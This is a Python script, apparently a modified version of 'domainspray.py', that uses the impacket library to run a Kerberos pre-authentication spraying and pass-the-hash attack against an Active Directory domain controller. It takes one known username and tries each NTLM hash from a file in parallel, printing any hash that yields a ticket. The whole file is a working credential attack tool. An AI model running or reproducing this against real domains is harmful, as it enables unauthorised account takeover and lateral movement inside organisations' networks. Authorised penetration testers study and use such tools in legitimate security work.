#!/usr/bin/python3
# by manesec mod for domainspray.py

from __future__ import division
from __future__ import print_function
import argparse
import sys
from binascii import unhexlify
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal

from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED

import socket

def login(arg):
    username, password, domain, lmhash, nthash, aesKey, dc_ip = arg 
    
    try:
        kerb_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        getKerberosTGT(kerb_principal, password, domain,
            unhexlify(lmhash), unhexlify(nthash), aesKey, dc_ip)
        print('[+] Success %s/%s - %s:%s' % (domain, username, lmhash, nthash) )

    except KerberosError as e:
        if (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value):
           print("[-] Could not find username: %s/%s" % (domain, username) )
        elif e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
            return
        else:
            print(e)
    except socket.error as e:
        print('[-] Could not connect to DC')
        return


def main():
    parser = argparse.ArgumentParser(add_help = True, description = "Kerberos AS-REQ Spraying Toolkit for a known user and PassTheHash Attack. (Base on domainspray.py and mod by @manesec).")
    
    group = parser.add_argument_group('authentication')
    group.add_argument('-user', action='store', metavar = "user", help='A known users to spray, format is [[domain/]username')
    group.add_argument('-hashes', action="store", metavar = "hashes_file", help='NTLM hashes, format is LMHASH:NTHASH in the files')

    group = parser.add_argument_group('connection')
    group.add_argument('-domain', action='store', metavar="domain",
                       help='FQDN of the target domain')
    group.add_argument('-dc-ip', action='store', metavar="ip address",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    group.add_argument('-t', action='store', metavar="int", default=5, type=int,
                       help='Number of thread, default is 5')                     

    group.add_argument('-v', action='store', metavar="0,1", default=0, type=int,
                       help='Show trying message, 1 will be enable, default is 0')      

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)
    
    options = parser.parse_args()

    if options.hashes is None :
        print("[ERROR] Please specify your hashes files.")
        parser.print_help()
        sys.exit(1)
    
    if options.user is None :
        print("[ERROR] Please specify a known user.")
        parser.print_help()
        sys.exit(1)

    if options.dc_ip is None:
        parser.print_help()
        sys.exit(1)

    if options.domain is None:
        parser.print_help()
        sys.exit(1)

    lmhash = ""
    nthash = ""

    executor = ThreadPoolExecutor(max_workers=2)
    all_task = []

    print("[*] Starting ...")
    with open(options.hashes,'r') as f:
        for line in f:
            line = line.strip()
            if(line == ""):
                continue
            if (line.find(":")!=-1):
                lmhash,nthash = line.split(":")
            else:
                lmhash = line
                nthash = line

            user = options.user.strip()
            domain = options.domain.strip()
            if (options.v == 1):
                print("[*] Trying to login %s -  %s : %s" % (user,lmhash,nthash))
            all_task.append(executor.submit(login,([user, '', domain, lmhash, nthash, None , options.dc_ip])))

    wait(all_task,return_when=ALL_COMPLETED)
    print("[!] Done")

if __name__ == "__main__":
    main()